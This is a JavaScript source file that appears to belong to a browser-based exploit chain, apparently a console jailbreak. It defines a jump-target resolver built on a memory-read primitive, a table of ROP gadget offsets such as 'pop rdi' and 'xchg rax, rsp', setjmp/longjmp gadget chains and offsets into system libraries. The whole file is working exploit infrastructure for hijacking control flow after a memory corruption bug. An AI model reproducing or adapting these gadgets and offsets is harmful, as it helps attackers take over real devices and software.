var p;

var get_jmptgt = function (addr) {
	var z = p.read4(addr) & 0xFFFF;
	var y = p.read4(addr.add32(2));
	if (z != 0x25ff) return 0;

	return addr.add32(y + 6);
}

var gadgets;

gadgetcache = {
	"ret": 0x0000003C,
	"pop rdi": 0x00251552,
	"pop rsi": 0x0003D0FE,
	"pop rdx": 0x003A9092,
	"pop rcx": 0x00026A5B,
	"pop r8": 0x00033212,
	"pop r9": 0x005C2701,
	
	"pop rax": 0x00033213,
	"pop rsp": 0x00014FE7,
	"mov [rdi], rax": 0x000206D9,
	"mov [rdi], rsi": 0x00035A60,
	"infloop": 0x0001DE41, //debug only

	"mov [rdi], eax": 0x00020408,
	"mov rax, r8": 0x0028D2C9,

	//branching
	"sete al": 0x0001E9F4,
	"setne al": 0x00008E70,
	"setg al": 0x000E5357,
	"setge al": 0x00619AC2,
	"setl al": 0x00591FFC,
	"setle al": 0x000CA3A1,
	"cmp [rcx], edi": 0x0010ED11,
	"shl rax, 3": 0x005E4A13,
	"add rax, rdx": 0x003D23AC,
	"mov rax, [rax]": 0x0002E6F2,
	"xchg rax, rsp": 0x020A1E68,
};

var setJmpOffset = 0xC06CC; // libk = 0x2C343;
var setJmpGadget_one = 0x006D0715;  //mov rax, qword ptr [rcx] ; mov rdi, rcx ; jmp qword ptr [rax + 0xa8]
var setJmpGadget_two = 0x0028EA63; // mov rdi, [rdi + 0x10] ; jmp qword ptr [rax + 8]

var longJmpOffset = 0xC0726; // libk = 0x2C39C;
var longJmpGadget_one = 0x006D0715; //mov rax, qword ptr [rcx] ; mov rdi, rcx ; jmp qword ptr [rax + 0xa8]
var longJmpGadget_two = 0x0028EA63; // mov rdi, [rdi + 0x10] ; jmp qword ptr [rax + 8]
var pthread_create_np_offset = 0x25A40;
var pthread_exit_offset = 0x1A1D0;
var libk__error_offset = 0x163C0;

var libcint_memset_page_offset = 0x54000;
var libk_stack_chk_fail_page_offset = 0x10000;
var libwk_first_vt_entry_offset = 0x998E00;

var nogc = [];
